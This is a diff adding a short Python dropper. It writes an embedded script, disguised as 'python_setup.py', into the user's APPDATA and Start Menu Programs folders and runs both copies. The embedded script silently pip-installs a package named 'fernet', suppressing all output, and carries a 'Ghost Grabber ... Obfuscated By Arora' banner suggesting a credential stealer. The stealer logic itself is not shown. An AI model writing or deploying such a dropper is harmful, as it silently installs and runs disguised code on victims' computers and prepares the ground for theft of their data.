@@ -1,0 +1,45 @@
+import sys
+import os
+
+content = """
+import subprocess
+import sys
+subprocess.run(["cmd.exe", "/c", sys.executable, "-m", "pip", "install", "fernet"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+from fernet import Fernet
+
+#   Created & Obfuscated By Arora
+#
+#
+#
+#      █████████  █████                        █████
+#     ███░░░░░███░░███                        ░░███
+#    ███     ░░░  ░███████    ██████   █████  ███████
+#   ░███          ░███░░███  ███░░███ ███░░  ░░░███░
+#   ░███    █████ ░███ ░███ ░███ ░███░░█████   ░███
+#   ░░███  ░░███  ░███ ░███ ░███ ░███ ░░░░███  ░███ ███
+#    ░░█████████  ████ █████░░██████  ██████   ░░█████
+#     ░░░░░░░░░  ░░░░ ░░░░░  ░░░░░░  ░░░░░░     ░░░░░
+#
+#      █████████                      █████     █████
+#     ███░░░░░███                    ░░███     ░░███
+#    ███     ░░░  ████████   ██████   ░███████  ░███████   ██████  ████████
+#   ░███         ░░███░░███ ░░░░░███  ░███░░███ ░███░░███ ███░░███░░███░░███
+#   ░███    █████ ░███ ░░░   ███████  ░███ ░███ ░███ ░███░███████  ░███ ░░░
+#   ░░███  ░░███  ░███      ███░░███  ░███ ░███ ░███ ░███░███░░░   ░███
+#    ░░█████████  █████    ░░████████ ████████  ████████ ░░██████  █████
+#     ░░░░░░░░░  ░░░░░      ░░░░░░░░ ░░░░░░░░  ░░░░░░░░   ░░░░░░  ░░░░░
+
+
+
+"""
+
+p = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'python_setup.py')
+pp = os.path.join(os.getenv('APPDATA'), 'python_setup.py')
+
+with open(p, 'w', encoding='utf-8') as file:
+    file.write(content)
+with open(pp, 'w', encoding='utf-8') as file:
+    file.write(content)
+
+os.system(sys.executable + " " + p)
+os.system(sys.executable + " " + pp)
